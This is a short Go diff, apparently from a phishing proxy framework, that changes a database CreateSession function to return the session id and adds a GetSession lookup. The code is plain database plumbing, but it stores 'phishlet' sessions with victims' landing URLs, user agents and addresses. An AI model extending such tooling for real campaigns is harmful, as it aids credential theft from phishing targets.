@@ -29,13 +29,18 @@ func NewDatabase(path string) (*Database, error) {
 	return d, nil
 }
 
-func (d *Database) CreateSession(sid string, phishlet string, landing_url string, useragent string, remote_addr string) error {
-	_, err := d.sessionsCreate(sid, phishlet, landing_url, useragent, remote_addr)
-	return err
+func (d *Database) CreateSession(sid string, phishlet string, landing_url string, useragent string, remote_addr string) (int, error) {
+	id, err := d.sessionsCreate(sid, phishlet, landing_url, useragent, remote_addr)
+	return id, err
 }
 
 func (d *Database) ListSessions() ([]*Session, error) {
 	s, err := d.sessionsList()
+	return s, err
+}
+
+func (d *Database) GetSession(sid string) (*Session, error) {
+	s, err := d.sessionsGetBySid(sid)
 	return s, err
 }
 
